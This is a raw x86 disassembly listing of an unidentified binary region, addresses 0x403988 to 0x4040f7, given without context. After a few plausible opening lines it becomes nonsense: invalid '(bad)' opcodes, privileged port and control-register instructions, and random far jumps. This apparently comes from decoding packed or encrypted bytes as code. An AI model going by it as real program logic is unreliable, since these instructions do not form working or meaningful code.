  403988:	mov    BYTE PTR [ebp-0x21],dl
  40398b:	cmp    eax,ecx
  40398d:	jae    0x405e2d
  403993:	and    edx,DWORD PTR ds:0x42b010
  403999:	lea    ecx,[eax-0x3272ec]
  40399f:	xor    edx,0x10ed
  4039a5:	jmp    0x405d01
  4039aa:	sub    DWORD PTR [esi+0x66],ebp
  4039ad:	std    
  4039ae:	sbb    ebp,esi
  4039b0:	cdq    
  4039b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039b2:	cld    
  4039b3:	ss scas al,BYTE PTR es:[edi]
  4039b5:	sub    ebp,DWORD PTR [ebx+eiz*1+0x7b]
  4039b9:	mov    ah,0x3b
  4039bb:	pop    edi
  4039bc:	jp     0x403a38
  4039be:	cmp    ebx,DWORD PTR [edi+0x7a]
  4039c1:	jp     0x4039d8
  4039c3:	or     BYTE PTR ds:0x6c45235f,bh
  4039c9:	pop    ebx
  4039ca:	push   ss
  4039cb:	cmp    eax,0x89bfa6e7
  4039d0:	sub    ebp,DWORD PTR [ecx]
  4039d2:	mov    DWORD PTR [ebp+0x40db1ff1],edi
  4039d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039d9:	pop    eax
  4039da:	ret    0x319f
  4039dd:	push   ds
  4039de:	mov    edx,0xbb41759a
  4039e3:	add    BYTE PTR [ebx],dh
  4039e5:	ret    0x4517
  4039e8:	cmp    eax,DWORD PTR [eax+0x73]
  4039eb:	pop    ecx
  4039ec:	bound  esi,QWORD PTR [ecx]
  4039ee:	sbb    esp,DWORD PTR [edx]
  4039f0:	call   0x6630a8fc
  4039f5:	in     al,0x20
  4039f7:	sti    
  4039f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039f9:	lds    edi,FWORD PTR [ebx]
  4039fb:	push   esi
  4039fc:	pop    ebx
  4039fd:	jle    0x403a14
  4039ff:	fnstsw WORD PTR [eax]
  403a01:	retf   0x80df
  403a04:	out    0xf9,al
  403a06:	sub    esp,ebp
  403a08:	sub    bh,al
  403a0a:	xchg   ch,bh
  403a0c:	adc    BYTE PTR [edx-0x2564de5a],dh
  403a12:	iret   
  403a13:	xchg   esi,eax
  403a14:	sbb    BYTE PTR [ebx-0x41],ch
  403a17:	iret   
  403a18:	pop    ecx
  403a19:	jmp    0x97cb:0xdffd4827
  403a20:	rol    ah,cl
  403a22:	jne    0x4039fa
  403a24:	push   0x4b122b18
  403a29:	les    ebp,FWORD PTR [eax-0x3e]
  403a2c:	stos   BYTE PTR es:[edi],al
  403a2d:	ds inc esp
  403a2f:	adc    ch,0x98
  403a32:	mov    bl,0x18
  403a34:	sbb    al,0x1e
  403a36:	loop   0x403a0c
  403a38:	retf   
  403a39:	jae    0x4039d7
  403a3b:	sbb    DWORD PTR [ecx+0xfd7519c],eax
  403a41:	mov    WORD PTR [ebx-0xc],?
  403a44:	mov    DWORD PTR [edi],ecx
  403a46:	cdq    
  403a47:	push   ds
  403a48:	pushf  
  403a49:	in     al,dx
  403a4a:	add    cl,BYTE PTR ss:[ebx]
  403a4d:	outs   dx,BYTE PTR ds:[esi]
  403a4e:	lods   al,BYTE PTR ds:[esi]
  403a4f:	clc    
  403a50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a51:	jecxz  0x4039fb
  403a53:	mov    al,0xb0
  403a55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a56:	ss call 0xb34c:0x8ae1b3c9
  403a5e:	fprem1 
  403a60:	and    bl,0x2
  403a63:	sbb    eax,0x188d3534
  403a68:	and    DWORD PTR [ecx+0xd2dda9d],edx
  403a6e:	adc    eax,0x46d736ad
  403a73:	lds    ebp,FWORD PTR fs:[eax]
  403a76:	pop    ebp
  403a77:	hlt    
  403a78:	dec    ebp
  403a79:	or     ch,0xd1
  403a7c:	test   eax,0xc63e11bd
  403a81:	(bad)  
  403a82:	ss xchg esi,eax
  403a84:	test   BYTE PTR [edi],0x24
  403a87:	adc    ch,dl
  403a89:	or     BYTE PTR [edi-0x714802cf],cl
  403a8f:	mov    eax,0xf10c65b
  403a94:	add    ah,BYTE PTR [edx]
  403a96:	std    
  403a97:	lock in eax,0x16
  403a9a:	mov    ebp,0x8024358
  403a9f:	sub    al,0xa5
  403aa1:	fs pop es
  403aa3:	pop    es
  403aa4:	inc    ebx
  403aa5:	mov    edx,DWORD PTR [edi-0x17]
  403aa8:	clc    
  403aa9:	add    cl,bl
  403aab:	sbb    esi,DWORD PTR [esp+ecx*2]
  403aae:	sub    al,0xeb
  403ab0:	clc    
  403ab1:	cdq    
  403ab2:	jns    0x403b0a
  403ab4:	jge    0x403aa8
  403ab6:	xchg   ebx,eax
  403ab7:	sbb    BYTE PTR [ebx+esi*1-0x78de1c66],ch
  403abe:	(bad)  
  403abf:	jle    0x403ab7
  403ac1:	cmp    DWORD PTR [edi],0x49
  403ac4:	jns    0x403a50
  403ac6:	push   ss
  403ac7:	sbb    dl,bl
  403ac9:	mov    al,ds:0x18a93df2
  403ace:	(bad)  
  403acf:	fld    DWORD PTR [ecx]
  403ad1:	test   eax,0xb5cebb69
  403ad6:	or     al,0xc1
  403ad8:	inc    ebx
  403ad9:	xor    ah,BYTE PTR [ebp-0x47d02a13]
  403adf:	mov    esp,0x91e99f52
  403ae4:	into   
  403ae5:	popf   
  403ae6:	jns    0x403ae6
  403ae8:	ss call 0xa606d90c
  403aee:	gs push ebx
  403af0:	retf   
  403af1:	pusha  
  403af2:	fidiv  WORD PTR [edx]
  403af4:	out    0xc2,eax
  403af6:	outs   dx,DWORD PTR ds:[esi]
  403af7:	jae    0x403b3a
  403af9:	push   ebx
  403afa:	out    dx,eax
  403afb:	popf   
  403afc:	rol    BYTE PTR [ecx],1
  403afe:	xchg   ebp,eax
  403aff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b00:	lock mov edi,DWORD PTR ds:0x5ce514e3
  403b07:	push   0x77
  403b09:	out    dx,eax
  403b0a:	mov    ch,0xaa
  403b0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b0d:	pusha  
  403b0e:	dec    esp
  403b0f:	loop   0x403a9c
  403b11:	adc    BYTE PTR ss:[edx],0xf6
  403b15:	call   DWORD PTR [edi]
  403b17:	ja     0x403ae2
  403b19:	std    
  403b1a:	dec    esi
  403b1b:	dec    edi
  403b1c:	(bad)  
  403b1d:	pop    ebx
  403b1e:	and    BYTE PTR [ebx+esi*1+0x7d],0x4a
  403b23:	xchg   esi,eax
  403b24:	inc    ebp
  403b25:	cdq    
  403b26:	dec    edi
  403b27:	cmp    bl,bh
  403b29:	mov    eax,0x2f6ec30e
  403b2e:	adc    dl,BYTE PTR [esi]
  403b30:	out    0x49,al
  403b32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b33:	ret    0xd99b
  403b36:	dec    ecx
  403b37:	mov    eax,ds:0xdfeec39c
  403b3c:	mov    ebx,ecx
  403b3e:	pop    esi
  403b3f:	ror    BYTE PTR [ecx+0x91fceed],0x6a
  403b46:	sub    al,0x61
  403b48:	stc    
  403b49:	inc    esp
  403b4a:	and    DWORD PTR [esi+0x13],esp
  403b4d:	dec    ecx
  403b4e:	es push eax
  403b50:	push   esi
  403b51:	inc    edx
  403b52:	mov    bh,0xe3
  403b54:	add    BYTE PTR [ecx-0x3a],al
  403b57:	repnz mov edi,0x3cddb882
  403b5d:	xor    BYTE PTR [eax-0x741f4526],dh
  403b63:	js     0x403bcf
  403b65:	push   cs
  403b66:	(bad)  [ecx+edx*1+0x43]
  403b6a:	jns    0x403be0
  403b6c:	inc    ebx
  403b6d:	pop    ebx
  403b6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b6f:	bound  edx,QWORD PTR ds:0xb9f7dec8
  403b75:	cli    
  403b76:	test   DWORD PTR ds:0x1343505b,ecx
  403b7c:	jle    0x403b90
  403b7e:	aam    0xd9
  403b80:	mov    al,0xb8
  403b82:	outs   dx,DWORD PTR ds:[esi]
  403b83:	data16 jecxz 0x403b56
  403b86:	lods   eax,DWORD PTR ss:[esi]
  403b88:	adc    BYTE PTR [ebx],al
  403b8a:	or     BYTE PTR [edi],ch
  403b8c:	cs fs pop edx
  403b8f:	mov    ecx,0xb92455d4
  403b94:	fs stc 
  403b96:	push   ecx
  403b97:	inc    edx
  403b98:	cmp    BYTE PTR [edx-0x65],0x67
  403b9c:	mov    ebp,gs
  403b9e:	inc    esi
  403b9f:	dec    esp
  403ba0:	xchg   esp,eax
  403ba1:	es dec esi
  403ba3:	sub    ah,BYTE PTR [esi-0x23]
  403ba6:	xchg   esi,eax
  403ba7:	dec    edx
  403ba8:	jg     0x403b7b
  403baa:	test   BYTE PTR [edx-0x26401ea8],bh
  403bb0:	pop    ebx
  403bb1:	push   es
  403bb2:	mov    bh,0x5e
  403bb4:	add    esi,eax
  403bb6:	fdiv   QWORD PTR [esi]
  403bb8:	mov    ch,0x8
  403bba:	rcl    cl,1
  403bbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bbd:	scas   eax,DWORD PTR es:[edi]
  403bbe:	jmp    0x1a75:0x800a79ed
  403bc5:	jl     0x403bcc
  403bc7:	sub    eax,0xa5ba3e24
  403bcc:	into   
  403bcd:	loope  0x403baf
  403bcf:	div    DWORD PTR [esi+0x46]
  403bd2:	(bad)  
  403bd3:	xor    eax,esi
  403bd5:	dec    esp
  403bd6:	fwait
  403bd7:	lahf   
  403bd8:	int    0x83
  403bda:	int    0xb0
  403bdc:	and    DWORD PTR [esi+0x46],0xf84904f7
  403be3:	mov    ax,ds:0x546e5d2a
  403be9:	mov    esi,0x4a23b8e0
  403bee:	fiadd  WORD PTR [ebp+0x5]
  403bf1:	xor    esi,DWORD PTR [ebp+0x1a]
  403bf4:	mov    esp,0x7cfc9134
  403bf9:	pop    ds
  403bfa:	ja     0x403b80
  403bfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bfd:	repnz sysexit 
  403c00:	lahf   
  403c01:	push   cs
  403c02:	out    0x0,eax
  403c04:	(bad)  
  403c05:	cmp    cl,cl
  403c07:	popw   es
  403c09:	sub    BYTE PTR [ecx-0x77],dh
  403c0c:	sbb    DWORD PTR [eax+eax*4+0x73],ecx
  403c10:	aaa    
  403c11:	loopne 0x403bb3
  403c13:	hlt    
  403c14:	es dec esp
  403c16:	(bad)  
  403c17:	loope  0x403ba8
  403c19:	loop   0x403c65
  403c1b:	fcmovnb st,st(1)
  403c1d:	in     eax,0x81
  403c1f:	sbb    bh,BYTE PTR [edi+ebx*2]
  403c22:	in     al,0xa6
  403c24:	and    esi,ebp
  403c26:	and    bh,BYTE PTR ds:0x247baaf0
  403c2c:	(bad)  
  403c2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c2e:	ins    BYTE PTR es:[edi],dx
  403c2f:	push   edx
  403c30:	adc    esp,DWORD PTR [ebp+0x671cd998]
  403c36:	(bad)  
  403c38:	mov    esp,0xa2cf3f96
  403c3d:	jnp    0x403c07
  403c3f:	pop    ecx
  403c40:	push   0x5227fe8d
  403c45:	in     al,dx
  403c46:	push   cs
  403c47:	(bad)  
  403c48:	jbe    0x403bfe
  403c4a:	lds    edx,FWORD PTR [ecx+0x2810d8b5]
  403c50:	jno    0x403c6c
  403c52:	ret    0x28a9
  403c55:	mov    ds:0x4301148b,eax
  403c5a:	(bad)  
  403c5b:	mov    al,ds:0x807a4238
  403c60:	push   edx
  403c61:	cs ja  0x403ca0
  403c64:	xchg   ebp,eax
  403c65:	cwde   
  403c66:	sbb    eax,0x4db34823
  403c6b:	call   0xdb15bebc
  403c70:	xchg   esp,eax
  403c71:	inc    ecx
  403c72:	mov    cl,0xaf
  403c74:	call   0xcda6a2fa
  403c79:	dec    edx
  403c7a:	outs   dx,BYTE PTR ds:[esi]
  403c7b:	div    BYTE PTR [edx+esi*4-0x6f96d3f0]
  403c82:	jb     0x403c61
  403c84:	cmp    eax,0x109cb50a
  403c89:	mov    ds:0x3f690328,eax
  403c8e:	js     0x403c6b
  403c90:	addr16 (bad) 
  403c92:	mov    ch,0x32
  403c94:	mov    ebp,0x317ed050
  403c99:	aaa    
  403c9a:	mov    ch,0xa
  403c9c:	mov    al,ds:0x38694b40
  403ca1:	shr    BYTE PTR [ecx-0xa221b44],cl
  403ca7:	add    esp,DWORD PTR [edi]
  403ca9:	jno    0x403cc4
  403cab:	rcr    DWORD PTR [eax],cl
  403cad:	jmp    0x7dd1:0xaa01f92
  403cb4:	repz ja 0x403ce6
  403cb7:	sub    eax,0x87325fae
  403cbc:	mov    esi,0xd746bfb5
  403cc1:	gs int 0xa
  403cc4:	xlat   BYTE PTR ds:[ebx]
  403cc5:	setns  BYTE PTR [edi-0x7c]
  403cc9:	dec    ecx
  403cca:	push   ecx
  403ccb:	jl     0x403c6b
  403ccd:	(bad)  
  403cce:	or     BYTE PTR es:[edi+0x58599d28],0x11
  403cd6:	xchg   esi,eax
  403cd7:	jmp    0x403c5e
  403cd9:	mov    ax,ds:0x43bdc35c
  403cdf:	inc    edx
  403ce0:	or     DWORD PTR ds:0x8dd6d6f7,0xe4413c5
  403cea:	jns    0x403d41
  403cec:	or     edx,DWORD PTR [ebp+ebx*8+0x564147bd]
  403cf3:	push   esi
  403cf4:	sub    bl,ah
  403cf6:	sbb    BYTE PTR [edi],ch
  403cf8:	mov    ah,0xa9
  403cfa:	dec    edx
  403cfb:	jl     0x403ce7
  403cfd:	and    al,0xb6
  403cff:	push   edi
  403d00:	and    al,0x40
  403d02:	es hlt 
  403d04:	fist   WORD PTR [eax]
  403d06:	and    dh,cl
  403d08:	ins    DWORD PTR es:[edi],dx
  403d09:	pop    ds
  403d0a:	pop    esi
  403d0b:	and    DWORD PTR [ecx-0x63],ebx
  403d0e:	cmp    al,0xf0
  403d10:	aaa    
  403d11:	cmp    esp,DWORD PTR [ebp-0x2]
  403d14:	out    0x2,al
  403d16:	mov    ebp,DWORD PTR [ebx+0x3e49b105]
  403d1c:	iret   
  403d1d:	js     0x403d0a
  403d1f:	adc    ebx,DWORD PTR [edi*8-0x5df732b0]
  403d26:	ficomp DWORD PTR [ebp+0x7]
  403d29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d2a:	es pusha 
  403d2c:	in     al,0xc0
  403d2e:	cmc    
  403d2f:	test   BYTE PTR [ebp+0x198cf1e4],bl
  403d35:	or     DWORD PTR [ebx+ebx*2-0x2c],edx
  403d39:	aaa    
  403d3a:	call   0x5b75:0xbd4d6cad
  403d41:	jmp    0x67c1d4ed
  403d46:	test   al,0xed
  403d48:	push   eax
  403d49:	push   es
  403d4a:	mov    ch,BYTE PTR [ecx+0x2d90c5e6]
  403d50:	jb     0x403d56
  403d52:	shr    DWORD PTR [esi-0x76],cl
  403d55:	mov    ah,0x53
  403d57:	arpl   WORD PTR [ebp+0x1c],dx
  403d5a:	xchg   ebx,eax
  403d5b:	mov    edi,0xf602bad0
  403d60:	(bad)  
  403d61:	jbe    0x403cea
  403d63:	and    BYTE PTR [ebp-0x12b15af4],ch
  403d69:	inc    ecx
  403d6a:	add    al,0x6e
  403d6c:	cmp    DWORD PTR [ecx-0x2b],edi
  403d6f:	mov    ecx,0xe2cd8074
  403d74:	add    eax,0xfe6fe939
  403d79:	jbe    0x403d45
  403d7b:	(bad)  
  403d7c:	lock mov dl,BYTE PTR [edx-0x48669972]
  403d83:	into   
  403d84:	rol    bl,1
  403d86:	(bad)  
  403d87:	add    al,BYTE PTR [edx-0x51c494a8]
  403d8d:	and    al,0x80
  403d8f:	je     0x403de6
  403d91:	in     al,dx
  403d92:	inc    ebp
  403d93:	call   0x879b1dda
  403d98:	or     ebx,ecx
  403d9a:	adc    al,0xdf
  403d9c:	and    ebp,edi
  403d9e:	cmp    al,0xa1
  403da0:	xchg   esi,eax
  403da1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403da2:	jne    0x403d39
  403da4:	fimul  WORD PTR [ecx]
  403da6:	inc    ebp
  403da7:	and    al,0x30
  403da9:	nop
  403daa:	shr    bh,cl
  403dac:	(bad)  
  403dad:	js     0x403d55
  403daf:	sub    DWORD PTR [edi+0x6f],ecx
  403db2:	in     eax,0x4e
  403db4:	and    eax,0x9daa8ca1
  403db9:	shl    BYTE PTR [eax+0x4d],0x13
  403dbd:	sti    
  403dbe:	jne    0x403dc3
  403dc0:	outs   dx,DWORD PTR ds:[esi]
  403dc1:	ja     0x403de3
  403dc3:	stos   BYTE PTR es:[edi],al
  403dc4:	pop    eax
  403dc5:	add    dl,0x76
  403dc8:	jmp    0x46820e9e
  403dcd:	adc    BYTE PTR es:[eax+0x7],cl
  403dd1:	rcl    dh,1
  403dd3:	push   0xffffffd4
  403dd5:	adc    dh,BYTE PTR [edi]
  403dd7:	jns    0x403dc4
  403dd9:	adc    ebp,DWORD PTR [ecx+0x1a]
  403ddc:	mov    ch,0x88
  403dde:	call   0x3f65d9a0
  403de3:	lock mov bh,0xb6
  403de6:	sub    DWORD PTR [ebp-0x4f5ee175],esi
  403dec:	dec    edi
  403ded:	retf   
  403dee:	mov    eax,eax
  403df0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403df1:	mov    cl,0x5b
  403df3:	mov    esp,es
  403df5:	inc    eax
  403df6:	jnp    0x403e23
  403df8:	cmp    dh,BYTE PTR [ecx+0x18]
  403dfb:	loopne 0x403e46
  403dfd:	add    dh,ah
  403dff:	cmp    BYTE PTR [esp+0x21],bh
  403e03:	js     0x403e3c
  403e05:	icebp  
  403e06:	das    
  403e07:	ja     0x403e79
  403e09:	inc    edx
  403e0a:	je     0x403d98
  403e0c:	sbb    DWORD PTR [ecx+0x4f],eax
  403e0f:	sub    edx,edi
  403e11:	push   ecx
  403e12:	mov    bl,0x29
  403e14:	(bad)  
  403e15:	std    
  403e16:	faddp  st(0),st
  403e18:	xor    eax,0xe0e025b5
  403e1d:	loopne 0x403e1c
  403e1f:	lea    edx,[edx+eax*4+0x41a6e75e]
  403e26:	adc    DWORD PTR [esi+edi*2-0x5621e1e],ecx
  403e2d:	mov    ds:0xcded77bc,eax
  403e32:	aaa    
  403e33:	popa   
  403e34:	and    edx,DWORD PTR [ebx]
  403e36:	neg    DWORD PTR [ebx-0x5f]
  403e39:	xchg   ebx,eax
  403e3a:	inc    esp
  403e3b:	in     eax,dx
  403e3c:	fadd   st,st(4)
  403e3e:	ins    BYTE PTR es:[edi],dx
  403e3f:	dec    esi
  403e40:	mov    cr3,edi
  403e43:	outs   dx,DWORD PTR ds:[esi]
  403e44:	jecxz  0x403e6c
  403e46:	or     al,0xed
  403e48:	mov    esp,0xb028a6b
  403e4d:	int3   
  403e4e:	jge    0x403e4a
  403e50:	ds (bad) 
  403e52:	not    eax
  403e54:	mov    al,0x16
  403e56:	div    BYTE PTR [ecx-0x12]
  403e59:	sub    eax,0x65515b5f
  403e5e:	jmp    0x1082:0x925d2beb
  403e65:	popf   
  403e66:	shl    BYTE PTR [esi+ebp*1],0xd1
  403e6a:	(bad)  
  403e6b:	dec    ebp
  403e6c:	or     BYTE PTR [ebx],dl
  403e6e:	mov    bl,0x26
  403e70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e71:	arpl   WORD PTR [edx+0x15],di
  403e74:	sbb    eax,DWORD PTR ss:[ebx]
  403e77:	sahf   
  403e78:	(bad)  
  403e79:	mov    edi,0x96d099a8
  403e7e:	pop    ds
  403e7f:	mov    ch,al
  403e81:	jnp    0x403e7f
  403e83:	mov    ecx,0x12d0d14f
  403e88:	imul   ebp,ebx,0x54
  403e8b:	adc    dh,ah
  403e8d:	mov    edx,0xc4446c8
  403e92:	aas    
  403e93:	xlat   BYTE PTR ds:[ebx]
  403e94:	fsubrp st(3),st
  403e96:	sti    
  403e97:	adc    esi,DWORD PTR [esi-0x1a]
  403e9a:	adc    al,0x7d
  403e9c:	in     eax,dx
  403e9d:	aam    0x25
  403e9f:	ficom  WORD PTR [edi+0x0]
  403ea2:	rcr    DWORD PTR [ecx],cl
  403ea4:	add    al,al
  403ea6:	pop    esp
  403ea7:	mov    al,ds:0xb953fbe5
  403eac:	inc    ebx
  403ead:	mov    dh,dl
  403eaf:	mov    ds:0x15e4b35c,eax
  403eb4:	in     eax,0x97
  403eb6:	test   BYTE PTR ds:0x37a1eaf5,al
  403ebc:	mov    ch,0x35
  403ebe:	inc    ebx
  403ebf:	dec    esp
  403ec0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ec1:	lahf   
  403ec2:	dec    esp
  403ec3:	lock push 0xae5c29f1
  403ec9:	pushf  
  403eca:	mov    dh,0xb6
  403ecc:	pushf  
  403ecd:	div    DWORD PTR [esi]
  403ecf:	addr16 mov esi,0x97dab8bc
  403ed5:	and    eax,0x384b9f49
  403eda:	and    BYTE PTR [ebx+0x9c5c8c8],bh
  403ee0:	(bad)  
  403ee2:	mov    esi,0x245da8e1
  403ee7:	dec    eax
  403ee8:	lds    edx,FWORD PTR [esi+0x217d11c5]
  403eee:	xlat   BYTE PTR ds:[ebx]
  403eef:	jp     0x403f16
  403ef1:	and    al,0xb7
  403ef3:	fldenv [edx]
  403ef5:	xchg   BYTE PTR [ecx-0x7f],bl
  403ef8:	stos   DWORD PTR es:[edi],eax
  403ef9:	xor    BYTE PTR ss:[ebx],cl
  403efc:	loope  0x403f00
  403efe:	in     eax,dx
  403eff:	add    DWORD PTR [esi-0x2d],ebp
  403f02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f03:	push   eax
  403f04:	jl     0x403ec1
  403f06:	mov    ss,WORD PTR [ecx]
  403f08:	test   DWORD PTR [ecx],ebx
  403f0a:	xlat   BYTE PTR ds:[ebx]
  403f0b:	adc    dh,cl
  403f0d:	jmp    0x403f89
  403f0f:	daa    
  403f10:	lods   al,BYTE PTR ds:[esi]
  403f11:	sub    edx,0x36
  403f14:	dec    esp
  403f15:	mov    dl,0x23
  403f17:	inc    ecx
  403f18:	fs mov ch,0xe9
  403f1b:	sub    bl,ch
  403f1d:	nop
  403f1e:	lds    ebp,FWORD PTR [ebx+0x193e7419]
  403f24:	ret    
  403f25:	jg     0x403f3f
  403f27:	outs   dx,DWORD PTR ds:[esi]
  403f29:	in     al,0xe3
  403f2b:	or     cl,BYTE PTR [ecx+0x36929436]
  403f31:	dec    ecx
  403f32:	mov    esi,0xe55009c7
  403f37:	outs   dx,BYTE PTR ds:[esi]
  403f38:	push   0x8eb90c2d
  403f3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f3e:	add    BYTE PTR [edx],dh
  403f40:	ret    
  403f41:	stos   DWORD PTR es:[edi],eax
  403f42:	in     eax,dx
  403f43:	jns    0x403f0f
  403f45:	popa   
  403f46:	(bad)  
  403f47:	aas    
  403f48:	dec    ebp
  403f49:	xchg   ebp,eax
  403f4a:	js     0x403f97
  403f4c:	hlt    
  403f4d:	or     eax,0x34f6bb52
  403f52:	(bad)  
  403f53:	push   ebp
  403f54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f55:	lods   eax,DWORD PTR ds:[esi]
  403f56:	add    al,0x45
  403f58:	and    edi,edi
  403f5a:	imul   DWORD PTR [ecx]
  403f5c:	xchg   edx,eax
  403f5d:	int3   
  403f5e:	cmp    DWORD PTR [ecx],edi
  403f60:	sbb    edi,DWORD PTR [edx+0x70]
  403f63:	jo     0x403f57
  403f65:	sahf   
  403f66:	popf   
  403f67:	int3   
  403f68:	cmp    dl,BYTE PTR [ecx]
  403f6a:	adc    eax,0x23987e9
  403f6f:	fld    DWORD PTR gs:[edi+edi*1]
  403f73:	rol    DWORD PTR [esi],1
  403f75:	and    BYTE PTR es:[edx-0x51],0x9e
  403f7a:	(bad)  
  403f7b:	xchg   ebp,eax
  403f7c:	adc    al,dh
  403f7e:	and    BYTE PTR [edx+0x76],ch
  403f81:	or     al,0x68
  403f83:	cld    
  403f84:	and    eax,0x41de8924
  403f89:	inc    ecx
  403f8a:	iret   
  403f8b:	cmp    al,bh
  403f8d:	adc    ebx,DWORD PTR [esi+edx*8-0x50f4417c]
  403f94:	adc    esi,esp
  403f96:	add    DWORD PTR [ebp-0xb],edx
  403f99:	cmp    dh,BYTE PTR [ecx-0x9]
  403f9c:	pop    edi
  403f9d:	in     eax,dx
  403f9e:	pop    ebx
  403f9f:	push   edi
  403fa0:	pusha  
  403fa1:	sub    eax,0xffd3eb61
  403fa6:	jmp    0x403f34
  403fa8:	in     al,0xc8
  403faa:	or     dh,BYTE PTR [esi+0x19]
  403fad:	pop    ecx
  403fae:	xor    bl,BYTE PTR [ecx+ebp*1-0x46ef28bb]
  403fb5:	les    edx,FWORD PTR [esi-0x10b690be]
  403fbb:	test   eax,0xd315ea37
  403fc0:	mov    dh,0x3
  403fc2:	pop    es
  403fc3:	or     al,0xe6
  403fc5:	dec    edi
  403fc6:	jb     0x403f6b
  403fc8:	out    0xc1,eax
  403fca:	mov    edx,edi
  403fcc:	repz std 
  403fce:	mul    BYTE PTR [edi]
  403fd0:	mov    DWORD PTR [edx-0x48],esi
  403fd3:	mov    ah,0x64
  403fd5:	cmp    eax,0x2923bf0
  403fda:	cdq    
  403fdb:	dec    ecx
  403fdc:	sbb    ch,BYTE PTR [edx-0x50]
  403fdf:	ror    DWORD PTR [esi],cl
  403fe1:	pop    ebx
  403fe2:	(bad)  
  403fe3:	fld    QWORD PTR [ecx-0x69]
  403fe6:	cdq    
  403fe7:	inc    edx
  403fe8:	sub    al,BYTE PTR [ecx]
  403fea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403feb:	loope  0x404013
  403fed:	jge    0x403f7f
  403fef:	fld    DWORD PTR [ecx+0x5c]
  403ff2:	sub    al,0x87
  403ff4:	jbe    0x403f9f
  403ff6:	mov    bl,0x5f
  403ff8:	scas   eax,DWORD PTR es:[edi]
  403ff9:	jno    0x403f97
  403ffb:	fwait
  403ffc:	cmp    bl,bh
  403ffe:	or     eax,eax
  404000:	fldenv [eax-0x48e0d0ae]
  404006:	mov    dh,0xea
  404008:	ret    0xfda5
  40400b:	outs   dx,DWORD PTR ds:[esi]
  40400c:	ja     0x403fdc
  40400e:	mov    dh,0x69
  404010:	outs   dx,BYTE PTR ds:[esi]
  404011:	jne    0x404047
  404013:	adc    DWORD PTR [ecx+0x79],ebx
  404016:	in     eax,0x29
  404018:	adc    esp,ebx
  40401a:	push   cs
  40401b:	add    ebx,DWORD PTR [esi-0x737c3275]
  404021:	add    DWORD PTR [edi+eax*8-0x6a9725f8],ecx
  404028:	enter  0xcb1d,0x7f
  40402c:	adc    BYTE PTR [ebx+0x712463f2],bh
  404032:	xchg   DWORD PTR [eax],ebp
  404034:	ret    
  404035:	repnz mov al,ds:0x1edadd38
  40403b:	or     ebx,DWORD PTR [edx+eiz*2+0x5a9ed56c]
  404042:	jg     0x403fdd
  404044:	mov    eax,ds:0xa7ec260f
  404049:	test   BYTE PTR [edx-0x73],bl
  40404c:	inc    ebx
  40404d:	push   edx
  40404e:	mov    ds:0xccd9878,al
  404053:	shl    DWORD PTR [ecx],0xb6
  404056:	xchg   bh,ch
  404058:	jl     0x404060
  40405a:	adc    dl,dh
  40405c:	mov    edx,esp
  40405e:	sub    BYTE PTR [ecx+0x35],dh
  404061:	jg     0x4040d6
  404063:	test   eax,0xd732ba25
  404068:	jns    0x404050
  40406a:	fs retf 
  40406c:	fist   WORD PTR [edx]
  40406e:	out    dx,eax
  40406f:	push   ds
  404070:	inc    esp
  404071:	daa    
  404072:	ins    BYTE PTR es:[edi],dx
  404073:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404074:	(bad)  
  404075:	stos   DWORD PTR es:[edi],eax
  404076:	mov    ebp,0x7df46eaf
  40407b:	jg     0x404005
  40407d:	fwait
  40407e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40407f:	adc    al,0x6
  404081:	into   
  404082:	ret    
  404083:	pop    ds
  404084:	push   eax
  404085:	sub    ah,BYTE PTR [esi+0x12643266]
  40408b:	push   0xffffffc5
  40408d:	(bad)  
  40408e:	ja     0x4040e0
  404090:	out    dx,eax
  404091:	data16 ss jb 0x404080
  404095:	cwde   
  404096:	adc    BYTE PTR [edx],bh
  404098:	jge    0x40404a
  40409a:	push   0x2d88d795
  40409f:	sub    dh,BYTE PTR [edi]
  4040a1:	call   0x1bc6:0x5e757999
  4040a8:	adc    BYTE PTR [eax],bh
  4040aa:	pop    ss
  4040ab:	popf   
  4040ac:	imul   edi,eax,0xffffffdc
  4040af:	and    al,0x34
  4040b1:	add    esi,DWORD PTR [edx]
  4040b3:	and    eax,DWORD PTR [eax-0x77]
  4040b6:	pop    ds
  4040b7:	mov    ebp,0x12bd249f
  4040bc:	and    eax,0x93c86efc
  4040c1:	push   0xb91cf10d
  4040c6:	push   ss
  4040c7:	ins    DWORD PTR es:[edi],dx
  4040c8:	add    BYTE PTR [edx],al
  4040ca:	mov    ebx,0xd26b47aa
  4040cf:	gs arpl sp,bx
  4040d2:	push   DWORD PTR [edi]
  4040d4:	push   ebx
  4040d5:	je     0x4040c5
  4040d7:	fcmovu st,st(5)
  4040d9:	rcl    DWORD PTR [eax-0x1a7f3bfa],cl
  4040df:	add    ch,BYTE PTR [ebx+0x71f24ffe]
  4040e5:	inc    ebp
  4040e6:	add    BYTE PTR [esi-0x4b3d3ff6],ah
  4040ec:	ins    DWORD PTR es:[edi],dx
  4040ed:	into   
  4040ee:	push   cs
  4040ef:	(bad)  
  4040f0:	icebp  
  4040f1:	xor    DWORD PTR [ecx+0x70f4e96],edx
  4040f7:	int    0x9f
